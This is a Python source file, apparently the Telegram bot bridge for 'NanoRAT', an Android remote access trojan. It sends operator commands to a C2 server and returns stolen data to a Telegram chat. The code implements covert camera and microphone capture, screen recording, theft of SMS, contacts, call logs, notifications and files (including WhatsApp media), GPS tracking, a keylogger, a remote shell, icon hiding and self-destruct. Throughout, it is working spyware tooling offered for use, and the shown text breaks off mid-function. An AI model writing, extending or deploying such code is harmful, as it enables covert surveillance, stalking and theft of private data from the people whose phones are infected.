#!/usr/bin/env python3
"""
NanoRAT Telegram Bridge — modern UI edition.

Bridges Telegram to the local Flask C2 server.
Handles inline keyboards, callback queries, activity display.
"""

import asyncio
import base64
import json
import os
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

import httpx

# ═══════════════════════════════════════════════════════
#   CONFIG
# ═══════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
CHAT_ID   = os.environ.get("TG_CHAT_ID", "YOUR_CHAT_ID_HERE")
API_BASE  = f"https://api.telegram.org/bot{BOT_TOKEN}"
C2_BASE   = os.environ.get("C2_BASE", "http://127.0.0.1:5000")
# The agent API key is not used by the bridge: operator endpoints are
# session-authenticated. Kept only so a wrong setup is obvious in logs.
C2_KEY    = os.environ.get("C2_API_KEY", "")
POLL_TIMEOUT = 25

STATE_FILE = Path.home() / ".c2" / "bridge_state.json"
STATE_FILE.parent.mkdir(exist_ok=True)

# In-memory state
state = {
    "selected": None,       # current device id (int)
    "menu_stack": [],       # for Back navigation
    "last_menu_msg": None,  # message id of last menu (to edit)
}


def load_state():
    if STATE_FILE.exists():
        try:
            data = json.loads(STATE_FILE.read_text())
            state["selected"] = data.get("selected")
        except Exception:
            pass


def save_state():
    STATE_FILE.write_text(json.dumps({"selected": state["selected"]}))


# ═══════════════════════════════════════════════════════
#   MARKDOWN ESCAPING
# ═══════════════════════════════════════════════════════
# The static UI text in this file uses Telegram Markdown on purpose. Values
# that come from the C2 do not: a device model containing "_" or a single
# "*" in a notification body makes the whole message fail to parse with
# "can't parse entities", which silently kills the menu. Everything
# device-supplied therefore goes through md().

_MD_SPECIAL = set("\\_*[]()~`>#+-=|{}.!")


def md(value) -> str:
    """Escape a device-supplied value for Telegram's legacy Markdown mode."""
    text = "" if value is None else str(value)
    return "".join("\\" + ch if ch in _MD_SPECIAL else ch for ch in text)


# ═══════════════════════════════════════════════════════
#   HTTP CLIENT (shared)
# ═══════════════════════════════════════════════════════
client = httpx.AsyncClient(timeout=POLL_TIMEOUT + 15)


# ═══════════════════════════════════════════════════════
#   TELEGRAM API
# ═══════════════════════════════════════════════════════
async def tg_post(method, data=None, files=None):
    try:
        r = await client.post(f"{API_BASE}/{method}", data=data or {}, files=files)
        return r.json()
    except Exception as e:
        print(f"[tg] {method} failed: {e}")
        return None


async def send_message(text, keyboard=None, chat_id=None, parse_mode="Markdown",
                       disable_preview=True):
    data = {
        "chat_id": chat_id or CHAT_ID,
        "text": text[:4000],
        "parse_mode": parse_mode,
        "disable_web_page_preview": "true" if disable_preview else "false",
    }
    if keyboard is not None:
        data["reply_markup"] = json.dumps(keyboard)
    return await tg_post("sendMessage", data)


async def edit_message(message_id, text, keyboard=None, parse_mode="Markdown",
                       disable_preview=True):
    data = {
        "chat_id": CHAT_ID,
        "message_id": message_id,
        "text": text[:4000],
        "parse_mode": parse_mode,
        "disable_web_page_preview": "true" if disable_preview else "false",
    }
    if keyboard is not None:
        data["reply_markup"] = json.dumps(keyboard)
    else:
        data["reply_markup"] = json.dumps({"inline_keyboard": []})
    return await tg_post("editMessageText", data)


async def delete_message(message_id):
    await tg_post("deleteMessage", {
        "chat_id": CHAT_ID,
        "message_id": message_id,
    })


async def answer_callback(cb_id, text=None, alert=False):
    data = {"callback_query_id": cb_id}
    if text:
        data["text"] = text[:200]
    if alert:
        data["show_alert"] = "true"
    await tg_post("answerCallbackQuery", data)


async def send_chat_action(action="typing"):
    await tg_post("sendChatAction", {
        "chat_id": CHAT_ID,
        "action": action,
    })


async def send_photo(filename, data_bytes, caption="", keyboard=None):
    files = {"photo": (filename, data_bytes, "image/jpeg")}
    data = {"chat_id": CHAT_ID}
    if caption:
        data["caption"] = caption[:1000]
        data["parse_mode"] = "Markdown"
    if keyboard is not None:
        data["reply_markup"] = json.dumps(keyboard)
    return await tg_post("sendPhoto", data, files=files)


async def send_document(filename, data_bytes, caption="", keyboard=None,
                        mime="application/octet-stream"):
    files = {"document": (filename, data_bytes, mime)}
    data = {"chat_id": CHAT_ID}
    if caption:
        data["caption"] = caption[:1000]
        data["parse_mode"] = "Markdown"
    if keyboard is not None:
        data["reply_markup"] = json.dumps(keyboard)
    return await tg_post("sendDocument", data, files=files)


# ═══════════════════════════════════════════════════════
#   C2 API
# ═══════════════════════════════════════════════════════
# The operator API is session-authenticated: log in once, keep the cookie
# (httpx does that automatically) and echo back the CSRF token on mutations.
C2_PASSWORD = os.environ.get("C2_OPERATOR_PASSWORD", "")
_c2_session_ok = False
_c2_csrf = ""


def c2_headers():
    headers = {"Content-Type": "application/json"}
    if _c2_csrf:
        headers["X-CSRF-Token"] = _c2_csrf
    return headers


async def c2_login(force: bool = False) -> bool:
    global _c2_session_ok, _c2_csrf

    if _c2_session_ok and not force:
        return True
    if not C2_PASSWORD:
        print("[c2] C2_OPERATOR_PASSWORD is not set — operator API will 401")
        return False

    try:
        r = await client.post(
            f"{C2_BASE}/login",
            data={"password": C2_PASSWORD},
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        if r.status_code not in (200, 302):
            print(f"[c2] login refused: HTTP {r.status_code}")
            return False

        s = await client.get(f"{C2_BASE}/api/session")
        if s.status_code != 200:
            print(f"[c2] session refused: HTTP {s.status_code}")
            return False

        _c2_csrf = s.json().get("csrf_token", "")
        _c2_session_ok = True
        print("[c2] operator session established")
        return True
    except Exception as e:
        print(f"[c2] login error: {e}")
        return False


async def _ensure_session() -> bool:
    return await c2_login()


async def c2_devices():
    if not await _ensure_session():
        return []
    try:
        r = await client.get(f"{C2_BASE}/api/devices", headers=c2_headers())
        return r.json()
    except Exception:
        return []


async def c2_device(dev_id):
    if not await _ensure_session():
        return None
    try:
        r = await client.get(f"{C2_BASE}/api/device/{dev_id}", headers=c2_headers())
        return r.json()
    except Exception:
        return None


async def c2_send_command(dev_id, ctype, args):
    if not await _ensure_session():
        return {"error": "no_session"}
    try:
        r = await client.post(
            f"{C2_BASE}/api/device/{dev_id}/command",
            headers=c2_headers(),
            json={"type": ctype, "args": args},
        )
        return r.json()
    except Exception as e:
        return {"error": str(e)}


async def c2_command_result(dev_id, cmd_id):
    if not await _ensure_session():
        return None
    try:
        r = await client.get(
            f"{C2_BASE}/api/device/{dev_id}/commands",
            headers=c2_headers(),
        )
        for c in r.json():
            if c["id"] == cmd_id:
                return c
    except Exception:
        pass
    return None


async def c2_wait_result(dev_id, cmd_id, timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        c = await c2_command_result(dev_id, cmd_id)
        if c and c["status"] in ("done", "failed"):
            return c
        await asyncio.sleep(0.8)
    return None


async def c2_files(dev_id):
    if not await _ensure_session():
        return []
    try:
        r = await client.get(f"{C2_BASE}/api/device/{dev_id}/files",
                             headers=c2_headers())
        return r.json()
    except Exception:
        return []


async def c2_file_bytes(file_id):
    if not await _ensure_session():
        return None
    try:
        r = await client.get(f"{C2_BASE}/api/file/{file_id}/raw",
                             headers=c2_headers())
        return r.content
    except Exception:
        return None


# ═══════════════════════════════════════════════════════
#   UI BUILDERS
# ═══════════════════════════════════════════════════════
def btn(text, data):
    return {"text": text, "callback_data": data}


def btn_url(text, url):
    return {"text": text, "url": url}


def fmt_size(n):
    if not n: return "0 B"
    for u in ["B", "KB", "MB", "GB"]:
        if n < 1024:
            return f"{n:.1f} {u}"
        n /= 1024
    return f"{n:.1f} TB"


def fmt_ago(iso):
    if not iso: return "?"
    try:
        dt = datetime.fromisoformat(iso.replace("Z", ""))
        if dt.tzinfo is not None:
            dt = dt.astimezone(timezone.utc).replace(tzinfo=None)
        # The server serialises naive UTC, so compare in naive UTC too.
        delta = datetime.now(timezone.utc).replace(tzinfo=None) - dt
        s = int(delta.total_seconds())
        if s < 5: return "now"
        if s < 60: return f"{s}s ago"
        if s < 3600: return f"{s//60}m ago"
        if s < 86400: return f"{s//3600}h ago"
        return f"{s//86400}d ago"
    except Exception:
        return "?"


def battery_icon(pct):
    if pct is None: return "❓"
    if pct >= 80: return "🔋"
    if pct >= 30: return "🔋"
    if pct >= 10: return "🪫"
    return "🪫"


# ═══════════════════════════════════════════════════════
#   MAIN MENU
# ═══════════════════════════════════════════════════════
async def main_menu_text():
    dev = await c2_device(state["selected"]) if state["selected"] else None

    lines = [
        "🤖 *NanoRAT — Control Center*",
        "━━━━━━━━━━━━━━━━━━━━━",
    ]

    if dev:
        ws = "🟢 WS" if dev.get("ws_online") else "🟡 HTTP"
        bat = dev.get("battery", 0)
        lines.append(f"📱 *{md(dev.get('model') or '?')}*")
        lines.append(f"🎯 {ws}   {battery_icon(bat)} {bat}%   ⏱ {fmt_ago(dev.get('last_seen'))}")
    else:
        lines.append("_no device selected_")
        lines.append("Tap *Devices* to choose.")

    return "\n".join(lines)


def main_menu_keyboard():
    return {
        "inline_keyboard": [
            [btn("📸 Capture", "menu:capture"), btn("🎙 Record", "menu:record")],
            [btn("📁 Files", "menu:files"), btn("📊 Info", "menu:info")],
            [btn("🎮 Control", "menu:control"), btn("💬 Comms", "menu:comms")],
            [btn("🔐 Privacy", "menu:privacy"), btn("⚙️ System", "menu:system")],
            [btn("📡 Devices", "menu:devices"), btn("🔄 Refresh", "act:refresh")],
            [btn("❌ Close", "menu:close")],
        ]
    }


# ═══════════════════════════════════════════════════════
#   SUB-MENUS
# ═══════════════════════════════════════════════════════
def back_row():
    return [
        btn("⬅️ Back", "menu:back"),
        btn("🏠 Main", "menu:main"),
        btn("❌ Close", "menu:close"),
    ]


def capture_menu():
    text = (
        "📸 *Capture & Screenshot*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Choose your target:"
    )
    kb = {
        "inline_keyboard": [
            [btn("📸 Screenshot", "act:screenshot")],
            [btn("🤳 Front camera", "act:camera:front"),
             btn("📷 Back camera", "act:camera:back")],
            [btn("🎥 Screen record 10s", "act:screen_record:10")],
            [btn("🎥 Screen record 30s", "act:screen_record:30")],
            back_row(),
        ]
    }
    return text, kb


def record_menu():
    text = (
        "🎙 *Audio Recording*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Select duration:"
    )
    kb = {
        "inline_keyboard": [
            [btn("🎙 5s", "act:mic:5"), btn("🎙 10s", "act:mic:10"),
             btn("🎙 30s", "act:mic:30")],
            [btn("🎙 60s", "act:mic:60")],
            back_row(),
        ]
    }
    return text, kb


def files_menu():
    text = (
        "📁 *Files*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Browse the device filesystem:"
    )
    kb = {
        "inline_keyboard": [
            [btn("📂 /sdcard", "act:ls:/sdcard")],
            [btn("📂 Downloads", "act:ls:/sdcard/Download")],
            [btn("📂 DCIM", "act:ls:/sdcard/DCIM")],
            [btn("📂 Pictures", "act:ls:/sdcard/Pictures")],
            [btn("📂 WhatsApp", "act:ls:/sdcard/Android/media/com.whatsapp/WhatsApp/Media")],
            [btn("📥 Download by path", "prompt:get")],
            back_row(),
        ]
    }
    return text, kb


async def info_menu():
    dev = await c2_device(state["selected"]) if state["selected"] else None
    lines = ["📊 *Device Info*", "━━━━━━━━━━━━━━━━━━━━━"]
    if dev:
        lines.append(f"📱 Model: `{md(dev.get('model'))}`")
        lines.append(f"🏭 Maker: `{md(dev.get('manufacturer'))}`")
        lines.append(f"🤖 Android: `{md(dev.get('android_version'))}` (SDK {dev.get('sdk_int')})")
        lines.append(f"💻 Host: `{md(dev.get('hostname'))}`")
        lines.append(f"{battery_icon(dev.get('battery'))} Battery: *{dev.get('battery')}%*")
        lines.append(f"🌐 IP: `{md(dev.get('ip_address'))}`")
        loc = ""
        if dev.get("city"):
            loc = f"{md(dev.get('city'))}, {md(dev.get('country') or '')}"
        elif dev.get("latitude"):
            loc = f"{dev['latitude']:.3f}, {dev['longitude']:.3f}"
        if loc:
            lines.append(f"📍 {md(loc)}")
        lines.append(f"🆔 `{dev.get('device_id')[:16]}…`")
    else:
        lines.append("_no device_")

    kb = {
        "inline_keyboard": [
            [btn("🌐 Network", "act:network"), btn("📍 Location", "act:location")],
            [btn("📦 Apps", "act:apps")],
            back_row(),
        ]
    }
    return "\n".join(lines), kb


def control_menu():
    text = (
        "🎮 *Control*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Device actions:"
    )
    kb = {
        "inline_keyboard": [
            [btn("🔒 Lock", "act:lock"), btn("🏠 Home", "act:home")],
            [btn("◀️ Back", "act:back"), btn("🪟 Recents", "act:recents")],
            [btn("💻 Shell", "prompt:shell")],
            [btn("🔗 Open URL", "prompt:url")],
            [btn("📱 Open app", "prompt:open")],
            back_row(),
        ]
    }
    return text, kb


def comms_menu():
    text = (
        "💬 *Comms*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Data extraction:"
    )
    kb = {
        "inline_keyboard": [
            [btn("📞 Call log", "act:calls"), btn("💬 SMS", "act:sms")],
            [btn("👥 Contacts", "act:contacts")],
            [btn("🔔 Notifications", "act:notif")],
            back_row(),
        ]
    }
    return text, kb


def privacy_menu():
    text = (
        "🔐 *Privacy*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Keylogger & monitoring:"
    )
    kb = {
        "inline_keyboard": [
            [btn("▶️ Start keylogger", "act:keylog_start")],
            [btn("⏹ Stop keylogger", "act:keylog_stop")],
            [btn("📤 Dump keystrokes", "act:keylog_dump")],
            [btn("🔔 Drain notifications", "act:notif")],
            back_row(),
        ]
    }
    return text, kb


def system_menu():
    text = (
        "⚙️ *System*\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Maintenance & admin:"
    )
    kb = {
        "inline_keyboard": [
            [btn("🔄 Refresh", "act:refresh")],
            [btn("👻 Hide icon", "act:hide_icon")],
            [btn("✅ Show icon", "act:show_icon")],
            [btn("💀 Self destruct", "prompt:selfdestruct")],
            back_row(),
        ]
    }
    return text, kb


async def devices_menu():
    devices = await c2_devices()
    lines = ["📡 *Devices*", "━━━━━━━━━━━━━━━━━━━━━"]

    if not devices:
        lines.append("_no devices connected_")
        kb = {"inline_keyboard": [[btn("🔄 Refresh", "menu:devices")],
                                   [btn("🏠 Main", "menu:main")]]}
        return "\n".join(lines), kb

    rows = []
    for d in devices:
        ws = "🟢" if d.get("ws_online") else ("🟡" if d.get("is_online") else "⚪")
        mark = "▸ " if d["id"] == state["selected"] else ""
        label = f"{mark}{ws} {md(d.get('model') or '?')} · #{d['id']}"
        rows.append([btn(label, f"dev:select:{d['id']}")])

    rows.append([btn("🔄 Refresh", "menu:devices")])
    rows.append(back_row()[:2])  # Back + Main
    return "\n".join(lines), {"inline_keyboard": rows}


# ═══════════════════════════════════════════════════════
#   MENU ROUTER
# ═══════════════════════════════════════════════════════
async def get_menu(name):
    if name == "main":
        return await main_menu_text(), main_menu_keyboard()
    if name == "capture":
        return capture_menu()
    if name == "record":
        return record_menu()
    if name == "files":
        return files_menu()
    if name == "info":
        return await info_menu()
    if name == "control":
        return control_menu()
    if name == "comms":
        return comms_menu()
    if name == "privacy":
        return privacy_menu()
    if name == "system":
        return system_menu()
    if name == "devices":
        return await devices_menu()
    return await get_menu("main")


# ═══════════════════════════════════════════════════════
#   CALLBACK HANDLING
# ═══════════════════════════════════════════════════════
async def handle_callback(cb):
    cb_id = cb["id"]
    data = cb.get("data", "")
    msg = cb.get("message", {})
    msg_id = msg.get("message_id")

    parts = data.split(":", 2)
    kind = parts[0]

    if kind == "menu":
        which = parts[1] if len(parts) > 1 else "main"
        if which == "close":
            await answer_callback(cb_id)
            await delete_message(msg_id)
            return
        if which == "back":
            await answer_callback(cb_id)
            if state["menu_stack"]:
                prev = state["menu_stack"].pop()
                text, kb = await get_menu(prev)
                await edit_message(msg_id, text, kb)
            else:
                text, kb = await get_menu("main")
                await edit_message(msg_id, text, kb)
            return
        # Navigate to sub-menu
        if which != "main":
            state["menu_stack"].append("main")
        else:
            state["menu_stack"] = []
        text, kb = await get_menu(which)
        await answer_callback(cb_id)
        try:
            await edit_message(msg_id, text, kb)
        except Exception:
            pass
        return

    if kind == "dev":
        op = parts[1] if len(parts) > 1 else ""
        arg = parts[2] if len(parts) > 2 else ""
        if op == "select":
            try:
                state["selected"] = int(arg)
                save_state()
                await answer_callback(cb_id, f"✓ device #{arg} selected")
                text, kb = await get_menu("main")
                await edit_message(msg_id, text, kb)
            except ValueError:
                await answer_callback(cb_id, "invalid device")
        return

    if kind == "act":
        action = parts[1] if len(parts) > 1 else ""
        sub = parts[2] if len(parts) > 2 else ""
        await answer_callback(cb_id, "⏳")
        asyncio.create_task(run_action(action, sub))
        return

    if kind == "prompt":
        what = parts[1] if len(parts) > 1 else ""
        await answer_callback(cb_id)
        prompts = {
            "shell": "Send: `/shell <command>`",
            "url": "Send: `/url <url>`",
            "open": "Send: `/open <package>`",
            "get": "Send: `/get <path>`",
            "selfdestruct": "Send: `/selfdestruct confirm`",
        }
        await send_message(prompts.get(what, "Send command"))
        return


# ═══════════════════════════════════════════════════════
#   ACTIONS
# ═══════════════════════════════════════════════════════
async def run_action(action, sub=""):
    if not state["selected"]:
        await send_message("⚠️ no device selected. Use /list then tap a device.")
        return

    dev = state["selected"]

    if action == "refresh":
        text, kb = await get_menu("main")
        await send_message(text, kb)
        return

    if action == "screenshot":
        await send_chat_action("upload_photo")
        msg = await send_message("📸 capturing…")
        cmd = await c2_send_command(dev, "screenshot", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=20)
        if not res or res["status"] != "done":
            await delete_message(msg["result"]["message_id"])
            await send_message(f"❌ failed: `{md(res['result'] if res else 'timeout')}`")
            return
        await asyncio.sleep(1)
        files = await c2_files(dev)
        shot = next((f for f in files if f["category"] == "screenshot"), None)
        await delete_message(msg["result"]["message_id"])
        if shot:
            b = await c2_file_bytes(shot["id"])
            if b:
                caption = f"📸 *Screenshot*\n`{datetime.now().strftime('%H:%M:%S')}` · {fmt_size(len(b))}"
                kb = {"inline_keyboard": [
                    [btn("🔄 Again", "act:screenshot"),
                     btn("📥 Download", f"file:dl:{shot['id']}")],
                ]}
                await send_photo("screen.jpg", b, caption, kb)
        return

    if action == "camera":
        cam = sub or "back"
        await send_chat_action("upload_photo")
        msg = await send_message(f"📷 taking {md(cam)} photo…")
        cmd = await c2_send_command(dev, "camera_photo", {"camera": cam})
        res = await c2_wait_result(dev, cmd["id"], timeout=25)
        await delete_message(msg["result"]["message_id"])
        if not res or res["status"] != "done":
            await send_message(f"❌ camera failed: `{md(res['result'] if res else 'timeout')}`")
            return
        await asyncio.sleep(1)
        files = await c2_files(dev)
        shot = next((f for f in files if f["category"] == "camera"), None)
        if shot:
            b = await c2_file_bytes(shot["id"])
            if b:
                await send_photo(f"cam_{md(cam)}.jpg", b, f"📷 *{cam} camera*")
        return

    if action == "screen_record":
        sec = int(sub) if sub.isdigit() else 20
        await send_message(f"🎥 recording {sec}s…")
        cmd = await c2_send_command(dev, "screen_record", {"duration": sec})
        res = await c2_wait_result(dev, cmd["id"], timeout=sec + 15)
        if not res or res["status"] != "done":
            await send_message(f"❌ record failed")
            return
        await asyncio.sleep(2)
        files = await c2_files(dev)
        rec = next((f for f in files if f["category"] == "screen_record"), None)
        if rec:
            b = await c2_file_bytes(rec["id"])
            if b:
                await send_document("recording.mp4", b,
                                     f"🎥 *Screen recording* · {sec}s · {fmt_size(len(b))}",
                                     mime="video/mp4")
        return

    if action == "mic":
        sec = int(sub) if sub.isdigit() else 10
        await send_message(f"🎙 recording {sec}s…")
        await send_chat_action("record_voice")
        cmd = await c2_send_command(dev, "mic_record", {"duration": sec})
        res = await c2_wait_result(dev, cmd["id"], timeout=sec + 15)
        if not res or res["status"] != "done":
            await send_message(f"❌ mic failed")
            return
        await asyncio.sleep(1)
        files = await c2_files(dev)
        mic = next((f for f in files if f["category"] == "mic"), None)
        if mic:
            b = await c2_file_bytes(mic["id"])
            if b:
                await send_document("mic.m4a", b, f"🎙 *Audio* · {sec}s",
                                     mime="audio/mp4")
        return

    if action == "info":
        text, kb = await info_menu()
        await send_message(text, kb)
        return

    if action == "network":
        await send_chat_action("typing")
        cmd = await c2_send_command(dev, "network_info", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=15)
        if not res or res["status"] != "done":
            await send_message(f"❌ network failed")
            return
        text = await format_network(res["result"])
        kb = {"inline_keyboard": [[btn("🔄 Refresh", "act:network")],
                                   back_row()[:2]]}
        await send_message(text, kb)
        return

    if action == "location":
        await send_chat_action("find_location")
        cmd = await c2_send_command(dev, "location", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=15)
        if not res or res["status"] != "done":
            await send_message(f"❌ location failed")
            return
        try:
            obj = json.loads(res["result"])
            if "error" in obj:
                await send_message(f"📍 {md(obj['error'])}")
                return
            lat = obj.get("lat", 0)
            lng = obj.get("lng", 0)
            acc = obj.get("accuracy", 0)
            prov = obj.get("provider", "?")
            # send native location
            await tg_post("sendLocation", {
                "chat_id": CHAT_ID,
                "latitude": str(lat),
                "longitude": str(lng),
            })
            # also send text
            text = (f"📍 *Location*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━\n"
                    f"Lat: `{lat}`\n"
                    f"Lng: `{lng}`\n"
                    f"Accuracy: `{acc}m`\n"
                    f"Provider: `{md(prov)}`")
            await send_message(text)
        except Exception as e:
            await send_message(f"❌ parse error: {md(e)}")
        return

    if action == "apps":
        await send_chat_action("upload_document")
        cmd = await c2_send_command(dev, "list_apps", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=20)
        if res and res["status"] == "done":
            await send_document("apps.json", res["result"].encode(),
                                 "📦 *Installed apps*", mime="application/json")
        return

    if action in ("calls", "sms"):
        ctype = "call_log" if action == "calls" else "sms_list"
        fname = "calls.json" if action == "calls" else "sms.json"
        title = "📞 Call log" if action == "calls" else "💬 SMS"
        await send_chat_action("upload_document")
        cmd = await c2_send_command(dev, ctype, {"limit": 50})
        res = await c2_wait_result(dev, cmd["id"], timeout=20)
        if res and res["status"] == "done":
            await send_document(fname, res["result"].encode(),
                                 f"*{title}*", mime="application/json")
        return

    if action == "contacts":
        await send_chat_action("upload_document")
        cmd = await c2_send_command(dev, "contacts", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=20)
        if res and res["status"] == "done":
            await send_document("contacts.json", res["result"].encode(),
                                 "👥 *Contacts*", mime="application/json")
        return

    if action == "notif":
        cmd = await c2_send_command(dev, "notifications", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=15)
        if res and res["status"] == "done":
            try:
                obj = json.loads(res["result"])
                count = obj.get("count", 0)
                items = obj.get("items", [])
                lines = [f"🔔 *Notifications* ({count})",
                          "━━━━━━━━━━━━━━━━━━━━━"]
                for n in items[-15:]:
                    t = (n.get("title") or "")[:50]
                    txt = (n.get("text") or "")[:80]
                    pkg = n.get("package", "")
                    lines.append(f"📱 `{md(pkg)}`")
                    if t: lines.append(f"   *{md(t)}*")
                    if txt: lines.append(f"   {md(txt)}")
                    lines.append("")
                await send_message("\n".join(lines) if items else "🔔 no notifications")
            except Exception:
                await send_message("🔔 done")
        return

    if action in ("lock", "home", "back", "recents"):
        ctype = {"lock": "lock_screen", "home": "go_home",
                 "back": "go_back", "recents": "recents"}[action]
        cmd = await c2_send_command(dev, ctype, {})
        res = await c2_wait_result(dev, cmd["id"], timeout=10)
        icon = {"lock": "🔒", "home": "🏠", "back": "◀️", "recents": "🪟"}[action]
        if res and res["status"] == "done":
            await send_message(f"{icon} done")
        else:
            await send_message(f"❌ {icon} failed: enable accessibility service")
        return

    if action == "keylog_start":
        cmd = await c2_send_command(dev, "keylog_start", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=10)
        await send_message("⌨️ keylogger *started*" if res and res["status"] == "done"
                            else "❌ failed to start keylogger")
        return

    if action == "keylog_stop":
        cmd = await c2_send_command(dev, "keylog_stop", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=10)
        await send_message("⌨️ keylogger *stopped*" if res and res["status"] == "done"
                            else "❌ failed")
        return

    if action == "keylog_dump":
        cmd = await c2_send_command(dev, "keylog_dump", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=15)
        if res and res["status"] == "done":
            try:
                obj = json.loads(res["result"])
                txt = obj.get("output", "") or "(empty)"
                lines = txt.strip().split("\n")[-60:]
                text = "⌨️ *Keystrokes*\n━━━━━━━━━━━━━━━━━━━━━\n```\n" + \
                       "\n".join(lines)[:3500] + "\n```"
                await send_message(text)
            except Exception:
                await send_message("⌨️ done")
        return

    if action == "ls":
        path = sub or "/sdcard"
        cmd = await c2_send_command(dev, "list_dir", {"path": path})
        res = await c2_wait_result(dev, cmd["id"], timeout=15)
        if res and res["status"] == "done":
            try:
                obj = json.loads(res["result"])
                entries = obj.get("entries", [])
                lines = [f"📂 `{md(path)}`",
                          f"━━━━━━━━━━━━━━━━━━━━━",
                          f"📊 {len(entries)} items:"]
                dirs = [e for e in entries if e.get("is_dir")]
                files_ = [e for e in entries if not e.get("is_dir")]
                for e in dirs[:15]:
                    lines.append(f"📁 `{md(e['name'])}`")
                for e in files_[:15]:
                    lines.append(f"📄 `{md(e['name'])}` · {fmt_size(e.get('size', 0))}")
                if len(dirs) + len(files_) > 30:
                    lines.append(f"_...and more_")
                await send_message("\n".join(lines))
            except Exception as e:
                await send_message(f"❌ {md(e)}")
        return

    if action == "hide_icon":
        cmd = await c2_send_command(dev, "hide_icon", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=10)
        await send_message("👻 icon hidden" if res and res["status"] == "done"
                            else "❌ failed")
        return

    if action == "show_icon":
        cmd = await c2_send_command(dev, "show_icon", {})
        res = await c2_wait_result(dev, cmd["id"], timeout=10)
        await send_message("✅ icon restored" if res and res["status"] == "done"
                            else "❌ failed")
        return


async def format_network(result):
    try:
        obj = json.loads(result)
    except Exception:
        return f"❌ parse error"
    lines = ["🌐 *Network*", "━━━━━━━━━━━━━━━━━━━━━"]
    if obj.get("has_wifi"):
        lines.append(f"📶 WiFi: *{md(obj.get('wifi_ssid', '?'))}*")
        lines.append(f"   IP: `{md(obj.get('wifi_ip', '?'))}`")
    if obj.get("has_cellular"):
        lines.append(f"📡 Cellular: *{md(obj.get('sim_operator', '?'))}*")
    if obj.get("has_vpn"):
        lines.append(f"🔐 VPN: *active*")
    ifs = obj.get("interfaces", [])
    if ifs:
        lines.append("")
        lines.append("*Interfaces:*")
        for i in ifs[:6]:
            lines.append(f"• `{md(i.get('interface'))}`: `{md(i.get('ip'))}`")
    return "\n".join(lines)


# ═══════════════════════════════════════════════════════
#   TEXT COMMANDS
# ═══════════════════════════════════════════════════════
async def handle_text(text):
    parts = text.strip().split(" ", 1)
    cmd = parts[0].lstrip("/").lower()
    arg = parts[1] if len(parts) > 1 else ""

    if cmd in ("start", "menu", "help"):
        text_, kb = await get_menu("main")
        await send_message(text_, kb)
        return

    if cmd == "list" or cmd == "devices":
        text_, kb = await get_menu("devices")
        await send_message(text_, kb)
        return

    if cmd == "use":
        try:
            state["selected"] = int(arg.strip())
            save_state()
            text_, kb = await get_menu("main")
            await send_message(f"✓ device #{state['selected']} selected")
            await send_message(text_, kb)
        except ValueError:
            await send_message("usage: `/use <device_id>`")
        return

    if cmd == "whoami":
        await send_message(f"current device: `{state['selected']}`")
        return

    if not state["selected"]:
        await send_message("⚠️ no device selected. Use /list")
        return

    dev = state["selected"]

    if cmd == "shell":
        if not arg:
            await send_message("usage: `/shell <command>`")
            return
        await send_chat_action("typing")
        cmd_r = await c2_send_command(dev, "shell", {"cmd": arg})
        res = await c2_wait_result(dev, cmd_r["id"], timeout=20)
        if res and res["status"] == "done":
            try:
                obj = json.loads(res["result"])
                out = (obj.get("stdout", "") + obj.get("stderr", ""))[:3500]
                exit_ = obj.get("exit", -1)
                text_ = f"💻 *shell* `[exit {exit_}]`\n```\n{out}\n```"
                await send_message(text_)
            except Exception:
                await send_message(f"```\n{res['result'][:3500]}\n```")
        else:
            await send_message("❌ shell failed")
        return

    if cmd == "screenshot":
        await run_action("screenshot")
        return
    if cmd == "camera":
        await run_action("camera", arg or "back")
        return
    if cmd == "mic":
        await run_action("mic", arg or "10")
        return
    if cmd == "location":
        await run_action("location")
        return
    if cmd == "contacts":
        await run_action("contacts")
        return
    if cmd == "sms":
        await run_action("sms")
        return
    if cmd == "calls":
        await run_action("calls")
        return
    if cmd == "apps":
        await run_action("apps")
        return
    if cmd == "network":
        await run_action("network")
        return
    if cmd == "notif":
        await run_action("notif")
        return
    if cmd == "lock":
        await run_action("lock")
        return
    if cmd == "home":
        await run_action("home")
        return
    if cmd == "back":
        await run_action("back")
        return
    if cmd == "recents":
        await run_action("recents")
        return
    if cmd == "keylog_start":
        await run_action("keylog_start")
        return
    if cmd == "keylog_stop":
        await run_action("keylog_stop")
        return
    if cmd == "keylog_dump":
        await run_action("keylog_dump")
        return
    if cmd == "ls":
        await run_action("ls", arg or "/sdcard")
        return
    if cmd == "hide_icon":
        await run_action("hide_icon")
        return
    if cmd == "show_icon":
        await run_action("show_icon")
        return

    if cmd == "get":
        if not arg:
            await send_message("usage: `/get /path/to/file`")
            return
        await send_chat_action("upload_document")
        cmd_r = await c2_send_command(dev, "download_file", {"path": arg})
        res = await c2_wait_result(dev, cmd_r["id"], timeout=45)
        if not res or res["status"] != "done":
            await send_message(f"❌ failed")
            return
        try:
            obj = json.loads(res["result"])
            b64 = obj.get("data_b64", "")
            if not b64:
                await send_message(f"❌ {md(obj.get('error', 'no data'))}")
                return
            b = base64.b64decode(b64)
            name = arg.split("/")[-1] or "file.bin"
            await send_document(name, b, f"📄 `{md(name)}` · {fmt_size(len(b))}")
        except Exception as e:
            await send_message(f"❌ {md(e)}")
        return

    if cmd == "open":
        cmd_r = await c2_send_command(dev, "open_app", {"package": arg})
        res = await c2_wait_result(dev, cmd_r["id"], timeout=10)
